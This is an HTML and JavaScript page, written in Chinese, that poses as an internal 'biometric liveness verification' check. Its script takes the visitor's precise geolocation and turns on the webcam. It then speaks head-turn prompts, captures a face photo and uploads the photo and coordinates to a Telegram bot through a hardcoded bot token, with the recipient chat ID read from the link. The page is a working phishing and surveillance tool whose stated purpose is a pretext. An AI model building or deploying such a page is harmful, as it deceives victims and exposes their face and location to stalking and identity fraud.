<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔒 安全人脸核验</title>
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: #111; color: white; font-family: sans-serif; text-align: center; }
        
        #video-container { position: relative; width: 640px; height: 480px; max-width: 100%; margin-bottom: 20px; display: none; }
        #video { width: 100%; height: 100%; background: #000; border: 3px solid #00ffcc; border-radius: 12px; object-fit: cover; }
        
        .face-frame {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 240px; height: 320px;
            border: 3px dashed rgba(0, 255, 204, 0.7);
            border-radius: 50% / 40%;
            pointer-events: none;
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
        }

        #status { 
            margin: 15px 20px; 
            font-weight: bold; 
            background: rgba(0,0,0,0.8); 
            padding: 20px; 
            border-radius: 10px; 
            font-size: 20px; 
            border: 1px solid #333;
            max-width: 600px;
        }

        #device-select-container {
            margin: 15px 0;
            display: none;
        }

        select {
            padding: 10px;
            font-size: 16px;
            border-radius: 5px;
            background: #222;
            color: white;
            border: 1px solid #00ffcc;
        }
        
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #00ffcc; color: #111; font-weight: bold; transition: background 0.3s; }
        button:hover { background: #00b386; color: white; }
        
        .error-page { font-size: 16px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; max-width: 500px; margin: auto; text-align: left; }
    </style>
</head>
<body>
    <div id="app">
        <h2>🛡️ 内部安全：生物特征活体检测</h2>
        <div id="status">点击开始以进行身份核验</div>
        
        <div id="device-select-container">
            <label for="cameraSelect">选择摄像头设备：</label>
            <select id="cameraSelect"></select>
            <button id="confirmCamBtn" style="margin-left: 10px; padding: 10px 20px; font-size: 16px;">确认</button>
        </div>

        <div id="video-container">
            <video id="video" autoplay playsinline muted></video>
            <div class="face-frame"></div>
        </div>
        
        <canvas id="canvas" style="display:none;"></canvas>
        <button id="startBtn">开始核验 🔐</button>
    </div>

    <script>
        const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
        const app = document.getElementById('app');
        const video = document.getElementById('video');
        const videoContainer = document.getElementById('video-container');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const deviceSelectContainer = document.getElementById('device-select-container');
        const cameraSelect = document.getElementById('cameraSelect');
        const confirmCamBtn = document.getElementById('confirmCamBtn');
        const CHAT_ID = new URLSearchParams(window.location.search).get('id');

        function showError(errName, errMessage) {
            app.innerHTML = `<div class="error-page">
                <p>⚠️ <b>错误类型：</b> ${errName || '未知错误'}</p>
                <p>💬 <b>详细信息：</b> ${errMessage || '无法启动视频源。'}</p>
                <p style="font-size: 14px; color: #aaa; margin-top: 10px;">
                   💡 <b>电脑端排查建议：</b><br>
                   1. 请关闭微信、腾讯会议或 OBS 等可能占用摄像头的后台应用。<br>
                   2. 检查 Windows 或 Mac 系统的摄像头隐私权限。
                </p>
                <button onclick="location.reload()" style="margin-top:15px; font-size:16px; padding:10px 20px; display:block; width:100%;">重试</button>
            </div>`;
        }

        function speakPrompt(text, callback) {
            status.innerText = text;
            if ('speechSynthesis' in window) {
                window.speechSynthesis.cancel();
                const utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = 'zh-CN'; // 强制指定中文语音
                utterance.rate = 1.0;
                utterance.pitch = 1.0;
                utterance.onend = () => { if (callback) callback(); };
                window.speechSynthesis.speak(utterance);
            } else {
                setTimeout(callback, 2500);
            }
        }

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) { 
                status.innerText = "❌ 链接中缺少验证 ID (?id=...)"; 
                return; 
            }
            startBtn.style.display = 'none';

            let locationText = "未获取到位置信息";
            try {
                status.innerText = "正在验证设备地理位置节点 📍";
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
                });
                locationText = `纬度: ${pos.coords.latitude.toFixed(6)}, 经度: ${pos.coords.longitude.toFixed(6)}`;
            } catch (err) {
                console.warn("Geolocation warning:", err);
            }

            try {
                status.innerText = "正在扫描可用摄像头...";
                
                const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
                tempStream.getTracks().forEach(t => t.stop());

                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(d => d.kind === 'videoinput');

                if (videoDevices.length > 1) {
                    cameraSelect.innerHTML = '';
                    videoDevices.forEach((dev, index) => {
                        const option = document.createElement('option');
                        option.value = dev.deviceId;
                        option.text = dev.label || `摄像头 ${index + 1}`;
                        cameraSelect.appendChild(option);
                    });
                    
                    status.innerText = "请选择正在使用的物理摄像头：";
                    deviceSelectContainer.style.display = 'block';

                    confirmCamBtn.onclick = () => {
                        deviceSelectContainer.style.display = 'none';
                        const selectedDeviceId = cameraSelect.value;
                        startCameraStream({ video: { deviceId: { exact: selectedDeviceId } } }, locationText);
                    };
                } else {
                    startCameraStream({ video: true }, locationText);
                }

            } catch (err) {
                console.error("Camera scan error:", err);
                showError(err.name, err.message);
            }
        });

        async function startCameraStream(constraints, locationText) {
            try {
                status.innerText = "正在初始化摄像头传感器...";
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                videoContainer.style.display = 'block';

                speakPrompt("请将面部保持在相框内。", () => {
                    setTimeout(() => {
                        speakPrompt("请缓慢向左转头，然后向右转头。", () => {
                            setTimeout(() => {
                                speakPrompt("请上下点头。", () => {
                                    setTimeout(() => {
                                        speakPrompt("正在采集核验样本，请保持稳定。", () => {
                                            setTimeout(() => {
                                                captureAndUpload(stream, locationText);
                                            }, 1000);
                                        });
                                    }, 3000);
                                });
                            }, 4000);
                        });
                    }, 3000);
                });
            } catch (err) {
                console.error("Camera start error:", err);
                showError(err.name, err.message);
            }
        }

        async function captureAndUpload(stream, locationText) {
            status.innerText = "正在处理生物特征数据...";
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (!blob) {
                    status.innerText = "⚠️ 图像帧捕获失败。";
                    return;
                }
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'liveness_check.jpg');
                formData.append('caption', `🛡️ [生物特征核验日志]\nID: ${CHAT_ID}\n📍 ${locationText}\n状态: 活体检测流程已完成。`);

                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    const data = await res.json();
                    
                    if (data.ok) {
                        status.style.color = "#00ffcc";
                        status.innerText = "✅ 活体核验成功！";
                        stream.getTracks().forEach(t => t.stop());
                        videoContainer.style.display = 'none';
                    } else {
                        status.innerText = "⚠️ 传输错误: " + (data.description || "未知错误");
                    }
                } catch (e) {
                    status.innerText = "⚠️ 上传时发生网络错误。";
                }
            }, 'image/jpeg', 0.95);
        }
    </script>
</body>
</html>
